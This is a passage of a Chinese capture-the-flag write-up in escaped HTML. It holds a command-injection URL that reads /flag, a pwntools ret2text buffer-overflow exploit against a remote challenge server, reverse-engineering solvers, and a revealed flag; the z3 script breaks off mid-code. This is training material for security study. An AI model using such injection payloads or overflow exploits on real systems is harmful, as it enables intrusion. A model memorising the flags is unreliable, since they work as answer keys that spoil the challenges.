&lt;span&gt;&lt;span&gt;http://156.233.233.20:58818/?text&lt;/span&gt;&lt;span&gt;=`&lt;/span&gt;&lt;span&gt;cat&lt;/span&gt;&lt;span&gt; /flag`&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;/p&gt;&lt;figure&gt;&lt;img src=&quot;https://cdn.nlark.com/yuque/0/2026/png/52637188/1768187227704-ebecd8cc-354a-469a-b8e5-8e2304df88a5.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot; /&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;
&lt;h3&gt;链式读取&lt;a href=&quot;#链式读取&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h3&gt;
&lt;p&gt;&lt;/p&gt;&lt;figure&gt;&lt;img src=&quot;https://cdn.nlark.com/yuque/0/2026/png/52637188/1768187390402-a07c66d6-3c42-45c9-bddb-499ffb4e51dc.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot; /&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;
&lt;h2&gt;文件包含&lt;a href=&quot;#文件包含-1&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h2&gt;
&lt;h3&gt;日志利用&lt;a href=&quot;#日志利用-1&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h3&gt;
&lt;h1&gt;PWN&lt;a href=&quot;#pwn&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;
&lt;h2&gt;你好，世界&lt;a href=&quot;#你好世界&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h2&gt;
&lt;h3&gt;签到&lt;a href=&quot;#签到&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h3&gt;

&lt;p&gt;&lt;/p&gt;&lt;figure&gt;&lt;img src=&quot;https://cdn.nlark.com/yuque/0/2026/png/52637188/1768187818220-a7f4911c-fd1d-4484-94d3-6ae8bcf8cc62.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot; /&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;
&lt;h2&gt;栈&lt;a href=&quot;#栈&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h2&gt;
&lt;h3&gt;ret2text&lt;a href=&quot;#ret2text&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;&lt;span&gt;&lt;span&gt;from&lt;/span&gt;&lt;span&gt; pwn &lt;/span&gt;&lt;span&gt;import&lt;/span&gt;&lt;span&gt; *&lt;/span&gt;&lt;/span&gt;
&lt;span&gt;&lt;/span&gt;
&lt;span&gt;&lt;span&gt;context.log_level &lt;/span&gt;&lt;span&gt;=&lt;/span&gt;&lt;span&gt; &apos;debug&apos;&lt;/span&gt;&lt;/span&gt;
&lt;span&gt;&lt;span&gt;context.arch &lt;/span&gt;&lt;span&gt;=&lt;/span&gt;&lt;span&gt; &apos;amd64&apos;&lt;/span&gt;&lt;/span&gt;
&lt;span&gt;&lt;/span&gt;
&lt;span&gt;&lt;span&gt;#p = process(&apos;./ret2text&apos;)&lt;/span&gt;&lt;/span&gt;
&lt;span&gt;&lt;span&gt;p &lt;/span&gt;&lt;span&gt;=&lt;/span&gt;&lt;span&gt; remote(&lt;/span&gt;&lt;span&gt;&apos;c.def.rs&apos;&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span&gt;58990&lt;/span&gt;&lt;span&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span&gt;&lt;span&gt;elf &lt;/span&gt;&lt;span&gt;=&lt;/span&gt;&lt;span&gt; ELF(&lt;/span&gt;&lt;span&gt;&apos;./ret2text&apos;&lt;/span&gt;&lt;span&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span&gt;&lt;/span&gt;
&lt;span&gt;&lt;span&gt;offset &lt;/span&gt;&lt;span&gt;=&lt;/span&gt;&lt;span&gt; 0x&lt;/span&gt;&lt;span&gt;40&lt;/span&gt;&lt;span&gt; +&lt;/span&gt;&lt;span&gt; 8&lt;/span&gt;&lt;span&gt; &lt;/span&gt;&lt;/span&gt;
&lt;span&gt;&lt;span&gt;backdoor_addr &lt;/span&gt;&lt;span&gt;=&lt;/span&gt;&lt;span&gt; elf.symbols[&lt;/span&gt;&lt;span&gt;&apos;backdoor&apos;&lt;/span&gt;&lt;span&gt;]&lt;/span&gt;&lt;/span&gt;
&lt;span&gt;&lt;/span&gt;
&lt;span&gt;&lt;span&gt;rop &lt;/span&gt;&lt;span&gt;=&lt;/span&gt;&lt;span&gt; ROP(elf)&lt;/span&gt;&lt;/span&gt;
&lt;span&gt;&lt;span&gt;ret_addr &lt;/span&gt;&lt;span&gt;=&lt;/span&gt;&lt;span&gt; rop.find_gadget([&lt;/span&gt;&lt;span&gt;&apos;ret&apos;&lt;/span&gt;&lt;span&gt;])[&lt;/span&gt;&lt;span&gt;0&lt;/span&gt;&lt;span&gt;]&lt;/span&gt;&lt;/span&gt;
&lt;span&gt;&lt;/span&gt;
&lt;span&gt;&lt;span&gt;payload &lt;/span&gt;&lt;span&gt;=&lt;/span&gt;&lt;span&gt; flat([&lt;/span&gt;&lt;span&gt;b&lt;/span&gt;&lt;span&gt;&apos;A&apos;&lt;/span&gt;&lt;span&gt; *&lt;/span&gt;&lt;span&gt; offset, ret_addr, backdoor_addr])&lt;/span&gt;&lt;/span&gt;
&lt;span&gt;&lt;/span&gt;
&lt;span&gt;&lt;span&gt;p.recvuntil(&lt;/span&gt;&lt;span&gt;b&lt;/span&gt;&lt;span&gt;&quot;Enter your input: &quot;&lt;/span&gt;&lt;span&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span&gt;&lt;span&gt;p.sendline(payload)&lt;/span&gt;&lt;/span&gt;
&lt;span&gt;&lt;span&gt;p.interactive()&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;/p&gt;&lt;figure&gt;&lt;img src=&quot;https://cdn.nlark.com/yuque/0/2026/png/52637188/1768529838015-edb46813-fa5f-415e-8b9c-1f3e410e8f42.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot; /&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;
&lt;h2&gt;堆&lt;a href=&quot;#堆&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h2&gt;
&lt;h3&gt;heap_overflow&lt;a href=&quot;#heap_overflow&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h3&gt;
&lt;h3&gt;fastbin_dup&lt;a href=&quot;#fastbin_dup&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h3&gt;
&lt;h1&gt;Reverse&lt;a href=&quot;#reverse&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;
&lt;h2&gt;欢迎来到逆向#1&lt;a href=&quot;#欢迎来到逆向1&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h2&gt;
&lt;p&gt;把 exe 丢进 IDA 分析  选中入口函数 main F5 反编译&lt;/p&gt;

&lt;p&gt;&lt;/p&gt;&lt;figure&gt;&lt;img src=&quot;https://cdn.nlark.com/yuque/0/2026/png/52637188/1768438757372-3d366202-ccc3-4c5d-b058-892e82b84087.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot; /&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;

&lt;p&gt;&lt;/p&gt;&lt;figure&gt;&lt;img src=&quot;https://cdn.nlark.com/yuque/0/2026/png/52637188/1768438841717-6a924fe3-562e-413b-a963-bd3efd057699.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot; /&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;
&lt;h2&gt;逆向#2&lt;a href=&quot;#逆向2&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h2&gt;
&lt;p&gt;反汇编主函数 可以看到 这段代码的核心校验逻辑&lt;/p&gt;

&lt;p&gt;&lt;/p&gt;&lt;figure&gt;&lt;img src=&quot;https://cdn.nlark.com/yuque/0/2026/png/52637188/1768442082377-e13be157-fb1e-4e40-9bc2-c48e8a176ed5.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot; /&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&lt;span&gt;&lt;span&gt;import&lt;/span&gt;&lt;span&gt; struct&lt;/span&gt;&lt;/span&gt;
&lt;span&gt;&lt;/span&gt;
&lt;span&gt;&lt;span&gt;v4 &lt;/span&gt;&lt;span&gt;=&lt;/span&gt;&lt;span&gt; [&lt;/span&gt;&lt;/span&gt;
&lt;span&gt;&lt;span&gt;    0x&lt;/span&gt;&lt;span&gt;90503151D000302&lt;/span&gt;&lt;span&gt;,&lt;/span&gt;&lt;/span&gt;
&lt;span&gt;&lt;span&gt;    0x&lt;/span&gt;&lt;span&gt;9050A0311390208&lt;/span&gt;&lt;span&gt;,&lt;/span&gt;&lt;/span&gt;
&lt;span&gt;&lt;span&gt;    0x&lt;/span&gt;&lt;span&gt;1B5056265439030B&lt;/span&gt;&lt;/span&gt;
&lt;span&gt;&lt;span&gt;]&lt;/span&gt;&lt;/span&gt;
&lt;span&gt;&lt;/span&gt;
&lt;span&gt;&lt;span&gt;# if ( ((unsigned __int8)Str[i] ^ 0x66) != *((_BYTE *)v4 + i) )&lt;/span&gt;&lt;/span&gt;
&lt;span&gt;&lt;span&gt;data &lt;/span&gt;&lt;span&gt;=&lt;/span&gt;&lt;span&gt; b&lt;/span&gt;&lt;span&gt;&apos;&apos;&lt;/span&gt;&lt;span&gt;.join(struct.pack(&lt;/span&gt;&lt;span&gt;&apos;&amp;lt;Q&apos;&lt;/span&gt;&lt;span&gt;, x) &lt;/span&gt;&lt;span&gt;for&lt;/span&gt;&lt;span&gt; x &lt;/span&gt;&lt;span&gt;in&lt;/span&gt;&lt;span&gt; v4)&lt;/span&gt;&lt;/span&gt;
&lt;span&gt;&lt;span&gt;flag &lt;/span&gt;&lt;span&gt;=&lt;/span&gt;&lt;span&gt; &apos;&apos;&lt;/span&gt;&lt;span&gt;.join(&lt;/span&gt;&lt;span&gt;chr&lt;/span&gt;&lt;span&gt;(b &lt;/span&gt;&lt;span&gt;^&lt;/span&gt;&lt;span&gt; 0x&lt;/span&gt;&lt;span&gt;66&lt;/span&gt;&lt;span&gt;) &lt;/span&gt;&lt;span&gt;for&lt;/span&gt;&lt;span&gt; b &lt;/span&gt;&lt;span&gt;in&lt;/span&gt;&lt;span&gt; data)&lt;/span&gt;&lt;/span&gt;
&lt;span&gt;&lt;/span&gt;
&lt;span&gt;&lt;span&gt;print&lt;/span&gt;&lt;span&gt;(flag)&lt;/span&gt;&lt;/span&gt;
&lt;span&gt;&lt;span&gt;&apos;&apos;&apos;&lt;/span&gt;&lt;/span&gt;
&lt;span&gt;&lt;span&gt;def{second_welcome_2@06}&lt;/span&gt;&lt;/span&gt;
&lt;span&gt;&lt;span&gt;&apos;&apos;&apos;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;h2&gt;逆向#3&lt;a href=&quot;#逆向3&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h2&gt;
&lt;p&gt;核心密码校验逻辑&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&lt;span&gt;&lt;span&gt;__int64 sub_140002900()&lt;/span&gt;&lt;/span&gt;
&lt;span&gt;&lt;span&gt;{&lt;/span&gt;&lt;/span&gt;
&lt;span&gt;&lt;span&gt;  FILE&lt;/span&gt;&lt;span&gt; *&lt;/span&gt;&lt;span&gt;v0; &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; rax&lt;/span&gt;&lt;/span&gt;
&lt;span&gt;&lt;span&gt;  FILE&lt;/span&gt;&lt;span&gt; *&lt;/span&gt;&lt;span&gt;v1; &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; rax&lt;/span&gt;&lt;/span&gt;
&lt;span&gt;&lt;span&gt;  char &lt;/span&gt;&lt;span&gt;*&lt;/span&gt;&lt;span&gt;v3; &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; rax&lt;/span&gt;&lt;/span&gt;
&lt;span&gt;&lt;span&gt;  int&lt;/span&gt;&lt;span&gt; v4; &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; edx&lt;/span&gt;&lt;/span&gt;
&lt;span&gt;&lt;span&gt;  int&lt;/span&gt;&lt;span&gt; v5; &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; ecx&lt;/span&gt;&lt;/span&gt;
&lt;span&gt;&lt;span&gt;  __int64 v6; &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; rdx&lt;/span&gt;&lt;/span&gt;
&lt;span&gt;&lt;span&gt;  char &lt;/span&gt;&lt;span&gt;*&lt;/span&gt;&lt;span&gt;v7; &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; r9&lt;/span&gt;&lt;/span&gt;
&lt;span&gt;&lt;span&gt;  char v8; &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; cl&lt;/span&gt;&lt;/span&gt;
&lt;span&gt;&lt;span&gt;  unsigned &lt;/span&gt;&lt;span&gt;int&lt;/span&gt;&lt;span&gt; v9; &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; r10d&lt;/span&gt;&lt;/span&gt;
&lt;span&gt;&lt;span&gt;  int&lt;/span&gt;&lt;span&gt; v10; &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; eax&lt;/span&gt;&lt;/span&gt;
&lt;span&gt;&lt;span&gt;  int&lt;/span&gt;&lt;span&gt; v11; &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; [rsp&lt;/span&gt;&lt;span&gt;+&lt;/span&gt;&lt;span&gt;28h&lt;/span&gt;&lt;span&gt;] [rbp&lt;/span&gt;&lt;span&gt;-&lt;/span&gt;&lt;span&gt;D0h]&lt;/span&gt;&lt;/span&gt;
&lt;span&gt;&lt;span&gt;  char v12; &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; [rsp&lt;/span&gt;&lt;span&gt;+&lt;/span&gt;&lt;span&gt;2Ch&lt;/span&gt;&lt;span&gt;] [rbp&lt;/span&gt;&lt;span&gt;-&lt;/span&gt;&lt;span&gt;CCh]&lt;/span&gt;&lt;/span&gt;
&lt;span&gt;&lt;span&gt;  char v13[&lt;/span&gt;&lt;span&gt;32&lt;/span&gt;&lt;span&gt;]; &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; [rsp&lt;/span&gt;&lt;span&gt;+&lt;/span&gt;&lt;span&gt;30h&lt;/span&gt;&lt;span&gt;] [rbp&lt;/span&gt;&lt;span&gt;-&lt;/span&gt;&lt;span&gt;C8h] &lt;/span&gt;&lt;span&gt;BYREF&lt;/span&gt;&lt;/span&gt;
&lt;span&gt;&lt;span&gt;  char v14[&lt;/span&gt;&lt;span&gt;32&lt;/span&gt;&lt;span&gt;]; &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; [rsp&lt;/span&gt;&lt;span&gt;+&lt;/span&gt;&lt;span&gt;50h&lt;/span&gt;&lt;span&gt;] [rbp&lt;/span&gt;&lt;span&gt;-&lt;/span&gt;&lt;span&gt;A8h] &lt;/span&gt;&lt;span&gt;BYREF&lt;/span&gt;&lt;/span&gt;
&lt;span&gt;&lt;span&gt;  char Buffer[&lt;/span&gt;&lt;span&gt;8&lt;/span&gt;&lt;span&gt;]; &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; [rsp&lt;/span&gt;&lt;span&gt;+&lt;/span&gt;&lt;span&gt;70h&lt;/span&gt;&lt;span&gt;] [rbp&lt;/span&gt;&lt;span&gt;-&lt;/span&gt;&lt;span&gt;88h&lt;/span&gt;&lt;span&gt;] &lt;/span&gt;&lt;span&gt;BYREF&lt;/span&gt;&lt;/span&gt;
&lt;span&gt;&lt;span&gt;  char v16; &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; [rsp&lt;/span&gt;&lt;span&gt;+&lt;/span&gt;&lt;span&gt;78h&lt;/span&gt;&lt;span&gt;] [rbp&lt;/span&gt;&lt;span&gt;-&lt;/span&gt;&lt;span&gt;80h&lt;/span&gt;&lt;span&gt;] &lt;/span&gt;&lt;span&gt;BYREF&lt;/span&gt;&lt;/span&gt;
&lt;span&gt;&lt;/span&gt;
&lt;span&gt;&lt;span&gt;  sub_140001520();&lt;/span&gt;&lt;/span&gt;
&lt;span&gt;&lt;span&gt;  sub_140002600(&lt;/span&gt;&lt;span&gt;&quot;Input password: &quot;&lt;/span&gt;&lt;span&gt;);&lt;/span&gt;&lt;/span&gt;
&lt;span&gt;&lt;span&gt;  v0 = __acrt_iob_func(&lt;/span&gt;&lt;span&gt;1u&lt;/span&gt;&lt;span&gt;);&lt;/span&gt;&lt;/span&gt;
&lt;span&gt;&lt;span&gt;  fflush(v0);&lt;/span&gt;&lt;/span&gt;
&lt;span&gt;&lt;span&gt;  v1 = __acrt_iob_func(&lt;/span&gt;&lt;span&gt;0&lt;/span&gt;&lt;span&gt;);&lt;/span&gt;&lt;/span&gt;
&lt;span&gt;&lt;span&gt;  if&lt;/span&gt;&lt;span&gt; ( &lt;/span&gt;&lt;span&gt;!&lt;/span&gt;&lt;span&gt;fgets(Buffer, &lt;/span&gt;&lt;span&gt;128&lt;/span&gt;&lt;span&gt;, v1) )&lt;/span&gt;&lt;/span&gt;
&lt;span&gt;&lt;span&gt;  {&lt;/span&gt;&lt;/span&gt;
&lt;span&gt;&lt;span&gt;    puts(&lt;/span&gt;&lt;span&gt;&quot;Read error.&quot;&lt;/span&gt;&lt;span&gt;);&lt;/span&gt;&lt;/span&gt;
&lt;span&gt;&lt;span&gt;    return&lt;/span&gt;&lt;span&gt; 1i64&lt;/span&gt;&lt;span&gt;;&lt;/span&gt;&lt;/span&gt;
&lt;span&gt;&lt;span&gt;  }&lt;/span&gt;&lt;/span&gt;
&lt;span&gt;&lt;span&gt;  Buffer[strcspn(Buffer, &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;\r\n&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;)] = &lt;/span&gt;&lt;span&gt;0&lt;/span&gt;&lt;span&gt;;&lt;/span&gt;&lt;/span&gt;
&lt;span&gt;&lt;span&gt;  if&lt;/span&gt;&lt;span&gt; ( strlen(Buffer) &lt;/span&gt;&lt;span&gt;!=&lt;/span&gt;&lt;span&gt; 8&lt;/span&gt;&lt;span&gt; )&lt;/span&gt;&lt;/span&gt;
&lt;span&gt;&lt;span&gt;    goto &lt;/span&gt;&lt;span&gt;LABEL_3&lt;/span&gt;&lt;span&gt;;&lt;/span&gt;&lt;/span&gt;
&lt;span&gt;&lt;span&gt;  v3 = Buffer;&lt;/span&gt;&lt;/span&gt;
&lt;span&gt;&lt;span&gt;  v4 = &lt;/span&gt;&lt;span&gt;305419896&lt;/span&gt;&lt;span&gt;;&lt;/span&gt;&lt;/span&gt;
&lt;span&gt;&lt;span&gt;  do&lt;/span&gt;&lt;/span&gt;
&lt;span&gt;&lt;span&gt;  {&lt;/span&gt;&lt;/span&gt;
&lt;span&gt;&lt;span&gt;    v5 = (unsigned __int8)&lt;/span&gt;&lt;span&gt;*&lt;/span&gt;&lt;span&gt;v3&lt;/span&gt;&lt;span&gt;++&lt;/span&gt;&lt;span&gt;;&lt;/span&gt;&lt;/span&gt;
&lt;span&gt;&lt;span&gt;    v4 = (v5 &lt;/span&gt;&lt;span&gt;^&lt;/span&gt;&lt;span&gt; __ROL4__(v4, &lt;/span&gt;&lt;span&gt;5&lt;/span&gt;&lt;span&gt;)) &lt;/span&gt;&lt;span&gt;-&lt;/span&gt;&lt;span&gt; 1640531527&lt;/span&gt;&lt;span&gt;;&lt;/span&gt;&lt;/span&gt;
&lt;span&gt;&lt;span&gt;  }&lt;/span&gt;&lt;/span&gt;
&lt;span&gt;&lt;span&gt;  while&lt;/span&gt;&lt;span&gt; ( v3 &lt;/span&gt;&lt;span&gt;!=&lt;/span&gt;&lt;span&gt; &amp;amp;&lt;/span&gt;&lt;span&gt;v16 );&lt;/span&gt;&lt;/span&gt;
&lt;span&gt;&lt;span&gt;  if&lt;/span&gt;&lt;span&gt; ( v4 &lt;/span&gt;&lt;span&gt;!=&lt;/span&gt;&lt;span&gt; -&lt;/span&gt;&lt;span&gt;1873306505&lt;/span&gt;&lt;span&gt; )&lt;/span&gt;&lt;/span&gt;
&lt;span&gt;&lt;span&gt;  {&lt;/span&gt;&lt;/span&gt;
&lt;span&gt;&lt;span&gt;LABEL_3&lt;/span&gt;&lt;span&gt;:&lt;/span&gt;&lt;/span&gt;
&lt;span&gt;&lt;span&gt;    puts(&lt;/span&gt;&lt;span&gt;&quot;Wrong password&quot;&lt;/span&gt;&lt;span&gt;);&lt;/span&gt;&lt;/span&gt;
&lt;span&gt;&lt;span&gt;    return&lt;/span&gt;&lt;span&gt; 1i64&lt;/span&gt;&lt;span&gt;;&lt;/span&gt;&lt;/span&gt;
&lt;span&gt;&lt;span&gt;  }&lt;/span&gt;&lt;/span&gt;
&lt;span&gt;&lt;span&gt;  puts(&lt;/span&gt;&lt;span&gt;&quot;Correct!&quot;&lt;/span&gt;&lt;span&gt;);&lt;/span&gt;&lt;/span&gt;
&lt;span&gt;&lt;span&gt;  v11 = &lt;/span&gt;&lt;span&gt;-&lt;/span&gt;&lt;span&gt;557828333&lt;/span&gt;&lt;span&gt;;&lt;/span&gt;&lt;/span&gt;
&lt;span&gt;&lt;span&gt;  v6 = &lt;/span&gt;&lt;span&gt;0i64&lt;/span&gt;&lt;span&gt;;&lt;/span&gt;&lt;/span&gt;
&lt;span&gt;&lt;span&gt;  v12 = &lt;/span&gt;&lt;span&gt;66&lt;/span&gt;&lt;span&gt;;&lt;/span&gt;&lt;/span&gt;
&lt;span&gt;&lt;span&gt;  v7 = v14;&lt;/span&gt;&lt;/span&gt;
&lt;span&gt;&lt;span&gt;  do&lt;/span&gt;&lt;/span&gt;
&lt;span&gt;&lt;span&gt;  {&lt;/span&gt;&lt;/span&gt;
&lt;span&gt;&lt;span&gt;    ++&lt;/span&gt;&lt;span&gt;v7;&lt;/span&gt;&lt;/span&gt;
&lt;span&gt;&lt;span&gt;    v8 = byte_140004040[v6] &lt;/span&gt;&lt;span&gt;-&lt;/span&gt;&lt;span&gt; 7&lt;/span&gt;&lt;span&gt;;&lt;/span&gt;&lt;/span&gt;
&lt;span&gt;&lt;span&gt;    v9 = &lt;/span&gt;&lt;span&gt;5&lt;/span&gt;&lt;span&gt; *&lt;/span&gt;&lt;span&gt; ((unsigned &lt;/span&gt;&lt;span&gt;int&lt;/span&gt;&lt;span&gt;)v6 &lt;/span&gt;&lt;span&gt;/&lt;/span&gt;&lt;span&gt; 5&lt;/span&gt;&lt;span&gt;);&lt;/span&gt;&lt;/span&gt;
&lt;span&gt;&lt;span&gt;    v10 = v6&lt;/span&gt;&lt;span&gt;++&lt;/span&gt;&lt;span&gt;;&lt;/span&gt;&lt;/span&gt;
&lt;span&gt;&lt;span&gt;    *&lt;/span&gt;&lt;span&gt;(v7 &lt;/span&gt;&lt;span&gt;-&lt;/span&gt;&lt;span&gt; 1&lt;/span&gt;&lt;span&gt;) = &lt;/span&gt;&lt;span&gt;*&lt;/span&gt;&lt;span&gt;((&lt;/span&gt;&lt;span&gt;_BYTE&lt;/span&gt;&lt;span&gt; *&lt;/span&gt;&lt;span&gt;)&lt;/span&gt;&lt;span&gt;&amp;amp;&lt;/span&gt;&lt;span&gt;v11 &lt;/span&gt;&lt;span&gt;+&lt;/span&gt;&lt;span&gt; (&lt;/span&gt;&lt;span&gt;int&lt;/span&gt;&lt;span&gt;)(v10 &lt;/span&gt;&lt;span&gt;-&lt;/span&gt;&lt;span&gt; v9)) &lt;/span&gt;&lt;span&gt;^&lt;/span&gt;&lt;span&gt; v8;&lt;/span&gt;&lt;/span&gt;
&lt;span&gt;&lt;span&gt;  }&lt;/span&gt;&lt;/span&gt;
&lt;span&gt;&lt;span&gt;  while&lt;/span&gt;&lt;span&gt; ( v6 &lt;/span&gt;&lt;span&gt;!=&lt;/span&gt;&lt;span&gt; 21&lt;/span&gt;&lt;span&gt; );&lt;/span&gt;&lt;/span&gt;
&lt;span&gt;&lt;span&gt;  v14[&lt;/span&gt;&lt;span&gt;21&lt;/span&gt;&lt;span&gt;] = &lt;/span&gt;&lt;span&gt;0&lt;/span&gt;&lt;span&gt;;&lt;/span&gt;&lt;/span&gt;
&lt;span&gt;&lt;span&gt;  sub_1400025A0(v13, &lt;/span&gt;&lt;span&gt;&quot;def{&lt;/span&gt;&lt;span&gt;%s&lt;/span&gt;&lt;span&gt;}&quot;&lt;/span&gt;&lt;span&gt;);&lt;/span&gt;&lt;/span&gt;
&lt;span&gt;&lt;span&gt;  puts(v13);&lt;/span&gt;&lt;/span&gt;
&lt;span&gt;&lt;span&gt;  return&lt;/span&gt;&lt;span&gt; 0i64&lt;/span&gt;&lt;span&gt;;&lt;/span&gt;&lt;/span&gt;
&lt;span&gt;&lt;span&gt;}&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;这题利用了自修改代码保护，在静态分析时隐藏真实逻辑；&lt;/p&gt;
&lt;p&gt;定位到核心校验函数 sub_140002900 分析出它要求输入一个 8 位密码&lt;/p&gt;

&lt;p&gt;&lt;/p&gt;&lt;figure&gt;&lt;img src=&quot;https://cdn.nlark.com/yuque/0/2026/png/52637188/1768470853206-17176aa5-b4f4-45c6-8729-5e7b9823949b.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot; /&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;
&lt;p&gt;使用基于常数 0x61C88647 的循环位移哈希算法进行验证&lt;/p&gt;
&lt;p&gt;通过还原验证成功后的解密逻辑，将数据段的密文每位先减去 7，再与 5 字节循环密钥序列 13 37 C0 DE 42 进行异或得到 Flag&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&lt;span&gt;&lt;span&gt;# pip install z3-solver -i https://pypi.tuna.tsinghua.edu.cn/simple&lt;/span&gt;&lt;/span&gt;
&lt;span&gt;&lt;span&gt;from&lt;/span&gt;&lt;span&gt; z3 &lt;/span&gt;&lt;span&gt;import&lt;/span&gt;&lt;span&gt; *&lt;/span&gt;&lt;/span&gt;
&lt;span&gt;&lt;/span&gt;
&lt;span&gt;&lt;span&gt;def&lt;/span&gt;&lt;span&gt; solve_password&lt;/span&gt;&lt;span&gt;():&lt;/span&gt;&lt;/span&gt;
&lt;span&gt;&lt;span&gt;    s &lt;/span&gt;&lt;span&gt;=&lt;/span&gt;&lt;span&gt; Solver()&lt;/span&gt;&lt;/span&gt;
&lt;span&gt;&lt;span&gt;    chars &lt;/span&gt;&lt;span&gt;=&lt;/span&gt;&lt;span&gt; [BitVec(&lt;/span&gt;&lt;span&gt;f&lt;/span&gt;&lt;span&gt;&apos;c_&lt;/span&gt;&lt;span&gt;{&lt;/span&gt;&lt;span&gt;i&lt;/span&gt;&lt;span&gt;}&lt;/span&gt;&lt;span&gt;&apos;&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span&gt;32&lt;/span&gt;&lt;span&gt;) &lt;/span&gt;&lt;span&gt;for&lt;/span&gt;&lt;span&gt; i &lt;/span&gt;&lt;span&gt;in&lt;/span&gt;&lt;span&gt; range&lt;/span&gt;&lt;span&gt;(&lt;/span&gt;&lt;span&gt;8&lt;/span&gt;&lt;span&gt;)]&lt;/span&gt;&lt;/span&gt;
&lt;span&gt;&lt;span&gt;    for&lt;/span&gt;&lt;span&gt; c &lt;/span&gt;&lt;span&gt;in&lt;/span&gt;&lt;span&gt; chars:&lt;/span&gt;&lt;/span&gt;
&lt;span&gt;&lt;span&gt;        s.add(c &lt;/span&gt;&lt;span&gt;&amp;gt;=&lt;/span&gt;&lt;span&gt; 32&lt;/span&gt;&lt;span&gt;, c &lt;/span&gt;&lt;span&gt;&amp;lt;=&lt;/span&gt;&lt;span&gt; 126&lt;/span&gt;&lt;span&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span&gt;&lt;span&gt;        &lt;/span&gt;&lt;/span&gt;
&lt;span&gt;&lt;span&gt;    # v4 = 305419896&lt;/span&gt;&lt;/span&gt;
&lt;span&gt;&lt;span&gt;    v4 &lt;/span&gt;&lt;span&gt;=&lt;/span&gt;&lt;span&gt; BitVecVal(&lt;/span&gt;&lt;span&gt;0x&lt;/span&gt;&lt;span&gt;12345678&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span&gt;32&lt;/span&gt;&lt;span&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span&gt;&lt;span&gt;    # 0x61C88647&lt;/span&gt;&lt;/span&gt;
&lt;span&gt;&lt;span&gt;    MAGIC&lt;/span&gt;&lt;span&gt; =&lt;/span&gt;&lt;span&gt; 0x&lt;/span&gt;&lt;span&gt;61C88647&lt;/span&gt;&lt;/span&gt;
&lt;span&gt;&lt;/span&gt;
